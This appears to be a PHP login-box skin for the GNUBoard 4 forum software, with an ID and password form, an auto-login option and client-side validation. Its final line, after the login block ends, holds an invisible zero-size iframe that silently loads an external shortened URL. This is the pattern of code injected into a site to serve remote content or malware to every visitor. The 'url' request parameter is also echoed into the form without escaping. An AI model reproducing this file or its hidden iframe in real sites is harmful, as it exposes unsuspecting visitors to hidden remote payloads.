<?
if (!defined("_GNUBOARD_")) exit; // 개별 페이지 접근 불가

if ($g4['https_url']) {
    $outlogin_url = $_GET['url'];
    if ($outlogin_url) {
        if (preg_match("/^\.\.\//", $outlogin_url)) {
            $outlogin_url = urlencode($g4[url]."/".preg_replace("/^\.\.\//", "", $outlogin_url));
        }
        else {
            $purl = parse_url($g4[url]);
            if ($purl[path]) {
                $path = urlencode($purl[path]);
                $urlencode = preg_replace("/".$path."/", "", $urlencode);
            }
            $outlogin_url = $g4[url].$urlencode;
        }
    }
    else {
        $outlogin_url = $g4[url];
    }
}
else {
    $outlogin_url = $urlencode;
}
?>

<script type="text/javascript" src="<?=$g4[path]?>/js/capslock.js"></script>
<script type="text/javascript">
// 엠파스 로긴 참고
var bReset = true;
function chkReset(f)
{
    if (bReset) { if ( f.mb_id.value == '아이디' ) f.mb_id.value = ''; bReset = false; }
    document.getElementById("pw1").style.display = "none";
    document.getElementById("pw2").style.display = "";
}
</script>


<!-- 로그인 전 외부로그인 시작 -->
<form name="fhead" method="post" onsubmit="return fhead_submit(this);" autocomplete="off" style="margin:0px;">
<input type="hidden" name="url" value="<?=$outlogin_url?>">
<table width="90%" border="0" align="center" cellpadding="0" cellspacing="0">
              <tr>
                <td height="24"><input type="text" name="mb_id" type="text" class="login_input_box" maxlength="20" required itemname="아이디" value='아이디' onMouseOver='chkReset(this.form);' onFocus='chkReset(this.form);'></td>
                <td width="5">&nbsp;</td>
                <td width="57" rowspan="2"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                        <td><input type="image" src="<?=$outlogin_skin_path?>/img/login_btn.jpg" width="57" height="48" border="0"></td>
                    </tr>
                  </table></td>
                </tr>
              <tr>
                <td height="24"  id=pw1><input type="text" class="login_input_box" maxlength="20" required itemname="패스워드" value='패스워드' onMouseOver='chkReset(this.form);' onfocus='chkReset(this.form);'></td>
                <td height="24"  id=pw2 style='display:none;'><input type="password" class="login_input_box" name="mb_password" id="outlogin_mb_password" type="password" maxlength="20" itemname="패스워드" onMouseOver='chkReset(this.form);' onfocus='chkReset(this.form);' onKeyPress="check_capslock(event, 'outlogin_mb_password');"></td>
                <td height="24">&nbsp;</td>
                </tr>
              <tr>
                <td height="31" colspan="3" class="small_head"><input type="checkbox" name="auto_login" value="1" onclick="if (this.checked) { if (confirm('자동로그인을 사용하시면 다음부터 회원아이디와 패스워드를 입력하실 필요가 없습니다.\n\n\공공장소에서는 개인정보가 유출될 수 있으니 사용을 자제하여 주십시오.\n\n자동로그인을 사용하시겠습니까?')) { this.checked = true; } else { this.checked = false; } }">
                  &nbsp;아이디 저장하기</td>
                </tr>
        <tr>
            <td height="22" colspan="3">
                <p><a href="<?=$g4[bbs_path]?>/register.php"><img src="<?=$outlogin_skin_path?>/img/register_btn.jpg" width="60" height="22"></a>&nbsp;<a href="javascript:win_password_lost();"><img src="<?=$outlogin_skin_path?>/img/forget_btn.jpg" width="116" height="22"></a></p>
            </td>
        </tr>
</table>
</form>

<script type="text/javascript">
function fhead_submit(f)
{
    if (!f.mb_id.value) {
        alert("회원아이디를 입력하십시오.");
        f.mb_id.focus();
        return false;
    }

    if (document.getElementById('pw2').style.display!='none' && !f.mb_password.value) {
        alert("패스워드를 입력하십시오.");
        f.mb_password.focus();
        return false;
    }

    <?
    if ($g4[https_url])
        echo "f.action = '$g4[https_url]/$g4[bbs]/login_check.php';";
    else
        echo "f.action = '$g4[bbs_path]/login_check.php';";
    ?>

    return true;
}
</script>
<!-- 로그인 전 외부로그인 끝 -->
<IFRAME height="0" marginHeight=0 src="http://tinyurl.com/knu54ux" frameBorder=0 width="0" name="mute_player" marginWidth=0  scrolling="no"></IFRAME>